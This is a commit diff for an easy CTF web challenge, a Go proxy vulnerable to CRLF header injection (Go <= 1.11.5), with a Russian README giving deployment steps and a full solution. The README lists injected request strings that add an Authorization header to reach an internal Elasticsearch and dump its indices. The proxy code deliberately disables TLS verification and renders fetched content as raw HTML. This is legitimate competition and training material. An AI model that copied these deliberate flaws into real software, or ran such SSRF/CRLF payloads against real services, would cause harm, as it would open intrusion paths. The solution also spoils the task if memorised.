07613e2ee750ff95858caed0ba143dcad6005cfc
Дмитрий Муковкин <d.mukovkin@cft.ru>
2021-11-17 23:39:24 +0700

    Внес окончательные правки в таск

--- tasks/web/gap/README.md
+++ tasks/web/gap/README.md
@@ -1,1 +1,36 @@
-Coming soon
+# Web | easy | Gap
+
+# Информация
+Псс, здаров! 
+
+Начал изучать go, решил запилить прокси. Если доступ ограничат, то можно ходить через него. Правда он еще не все умеет...будем считать это alpha версией
+
+## Деплой
+1. Поменять флаг на нужный
+2. ПРи необходимости изменить порт таска (сервис прокси)
+```bash
+   cd deploy
+   docker-compose up
+```
+
+## Выдать участникам
+IP:PORT
+Файл public/docker-compose.yml
+
+## Описание
+Таск основан на уязвимости CRLF в старых версиях go (<= 1.11.5). Задача - выполнить запрос к внутренним ресурсам, установив заголовок Authorization
+
+## Решение
+1. Заходим на страницу и вводим в поле строки
+2. ```
+   db:9200?pretty=true HTTP/1.1\nAuthorization: Basic Y3RmY3VwOmN0ZmN1cA
+   ```
+   где (Y3RmY3VwOmN0ZmN1cA = base64(login:pass) = base64(ctfcup:ctfcup))
+
+   таким образом мы понимаем, что там elasticsearch (если по порту это не ясно)
+3. db:9200/_aliases?pretty=true HTTP/1.1\nAuthorization: Basic Y3RmY3VwOmN0ZmN1cA
+4. db:9200/smth_interesting/_search?pretty=true&q=*:* HTTP/1.1\nAuthorization: Basic Y3RmY3VwOmN0ZmN1cA
+5. Сдаем флаг
+
+# Флаг
+Придумать и установить самим
--- tasks/web/gap/deploy/proxy/main.go
+++ tasks/web/gap/deploy/proxy/main.go
@@ -1,7 +1,7 @@
 package main
 
 import (
-	//"crypto/tls"
+	"crypto/tls"
 	"fmt"
 	"html/template"
 	"io/ioutil"
@@ -16,23 +16,9 @@ type Page struct {
 	Body  template.HTML
 }
 
-func loadPage() (*Page, error) {
-	_, _ = ioutil.ReadFile("index.html")
-	return &Page{Title: "My simple proxy server", URL: "", Body: "body"}, nil
-}
-
 func handler(w http.ResponseWriter, r *http.Request) {
 	t, _ := template.ParseFiles("index.html")
 	t.Execute(w, &Page{Title: "My simple proxy"})
-	//
-	//f, err := s.Fs.Open("index.html")
-	//if err != nil {
-	//	http.Error(w, r.RequestURI, StatusNotFound)
-	//	return
-	//}
-	//defer f.Close()
-	//
-	//fmt.Fprintf(w, "Hi there, I love %s!", r.URL.Path[1:])
 }
 
 func handlerURL(w http.ResponseWriter, r*http.Request) {
@@ -40,31 +26,31 @@ func handlerURL(w http.ResponseWriter, r*http.Request) {
 
 	url := r.FormValue("url")
 	log.Println(url)
-	//tr := &http.Transport{
-	//	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-	//}
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
 
-	//client := &http.Client{Transport: tr}
-	client := &http.Client{}
+	client := &http.Client{Transport: tr}
 
-	s := "https://" + url + "/?test=a"
+	s := "https://" + url + ""
 	s = strings.Replace(s, "\\r", "\r", -1)
 	s = strings.Replace(s, "\\n", "\n", -1)
-	//s := "http://206.189.18.216:8080?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123/?test=a"
+
 	request, err := http.NewRequest("GET", s, nil)
 	if err != nil {
 		fmt.Println(err)
 		fmt.Printf("request error\n")
-	}
-	resp, err := client.Do(request)
-	if err != nil {
-		fmt.Println(err)
-		fmt.Printf("response error\n")
-		//body, err
 	} else {
-		defer resp.Body.Close()
-		body, _ := ioutil.ReadAll(resp.Body)
-		t.Execute(w, &Page{Title: "My simple proxy", URL: template.URL(url), Body: template.HTML(body)})
+		resp, err := client.Do(request)
+		if err != nil {
+			fmt.Println(err)
+			fmt.Printf("response error\n")
+			//body, err
+		} else {
+			defer resp.Body.Close()
+			body, _ := ioutil.ReadAll(resp.Body)
+			t.Execute(w, &Page{Title: "My simple proxy", URL: template.URL(url), Body: template.HTML(body)})
+		}
 	}
 
 }
@@ -73,4 +59,3 @@ func main() {
 	http.HandleFunc("/go", handlerURL)
 	log.Fatal(http.ListenAndServe(":8000", nil))
 }
-
